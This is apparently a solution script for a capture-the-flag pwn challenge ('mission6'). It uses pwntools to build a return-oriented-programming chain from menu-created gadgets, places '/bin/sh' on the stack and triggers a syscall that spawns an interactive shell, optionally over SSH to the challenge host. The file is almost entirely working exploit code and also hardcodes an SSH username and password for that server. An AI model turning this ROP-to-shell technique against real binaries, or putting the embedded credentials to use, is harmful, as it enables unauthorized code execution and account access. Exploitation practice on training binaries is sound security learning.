from pwn import *
from sys import *

SERVER = "bin.chall.necst.it"
PORT = 22
BINARY = "mission6"
REMOTE_BINARY = "/home/m226002/" + BINARY + "/" + BINARY
PASSWORD = "unixporn"
USER = "m226002"

if "--remote" in sys.argv:
    s = ssh(user=USER, host=SERVER, port=PORT, password=PASSWORD)
    r = s.process(REMOTE_BINARY)
else:
    r = process(BINARY)

if "--debug" in sys.argv:
    gdb.attach(r, """
        #breakpoints
        unset environment
        # b add_value
        # b get_present
        # b* 0x401064
        b* 0x040114c
        c
        """)
    raw_input("wait")

#code 

# puts"1) RET");
# puts("2) POP RDI");
# puts("3) POP RSI");
# puts("4) POP RDX");
# puts("5) POP RBX");
# puts("6) SYSCALL");
# puts("7) POP RAX");
# puts("8) MOV ?,EAX");
# puts("9) MOV EAX,?");

timesleep = 0.5
binsh_addr = 0x7fffffffdf28
gadget_addr = 0x0

def createGadget(list):
    global gadget_addr
    r.recv()
    if len(list) != 4:
        assert "gadget too long"
    
    r.sendline('3')
    sleep(timesleep)
    for x in list:
        r.sendline(str(x))
        sleep(timesleep)
    
    r.recvuntil("Gadget created at ")
    x = r.recv(14)
    gadget_addr = int(x, 16)
    print(hex(gadget_addr))

def addOnstackAddr(id, value):
    r.recvuntil("> ")
    r.sendline('1')
    sleep(timesleep)
    print(r.recvuntil("ID: "))
    r.sendline(str(id))
    sleep(timesleep)
    x = r.recvuntil(":")
    print(x)
    if x == "Big endian:":
        value = invert_endianness(val=value)
    
    r.sendline(str(value))
    sleep(timesleep)

def addOnstackBytes(id, value):
    r.recvuntil("> ")
    r.sendline('1')
    sleep(timesleep)
    print(r.recvuntil("ID: "))
    r.sendline(str(id))
    sleep(timesleep)
    x = r.recvuntil(":")
    print(x)
    if x == "Big endian:":
        print("OK")
        val = bytes_to_int(value, byteorder='little')
        val = invert_endianness(val=val)
    else:
        val = bytes_to_int(value, byteorder='little')
    r.sendline(str(val))
    sleep(timesleep)

# def bytes_to_int(b, byteorder):
#     if byteorder == 'little':
#         result = 0
#         for i in range(len(b)):
#             result += ord(b[i]) << (i * 8)
#         return result
#     elif byteorder == 'big':
#         result = 0
#         for i in range(len(b)):
#             result += ord(b[i]) << ((len(b) - i - 1) * 8)
#         return result
#     else:
#         raise ValueError("byteorder must be either 'little' or 'big'")
    
def bytes_to_int(data, byteorder='little'):
    if byteorder not in ('little', 'big'):
        raise ValueError("byteorder must be either 'little' or 'big'")
    
    if byteorder == 'little':
        data = data[::-1]
    
    result = 0
    for byte in data:
        result = (result << 8) + ord(byte)
    return result

def invert_endianness(val):
    new_val = 0
    for _ in range(8):
        new_val = (val & 0xff) | (new_val << 8)
        val >>= 8
    return new_val

createGadget([3, 7, 2, 6])
addOnstackBytes(0x1b, "/bin/sh")
addOnstackBytes(0x2b, "LOOL")
addOnstackAddr(0x02, gadget_addr)
addOnstackAddr(0x3b, binsh_addr)

r.sendline('4')

r.interactive()
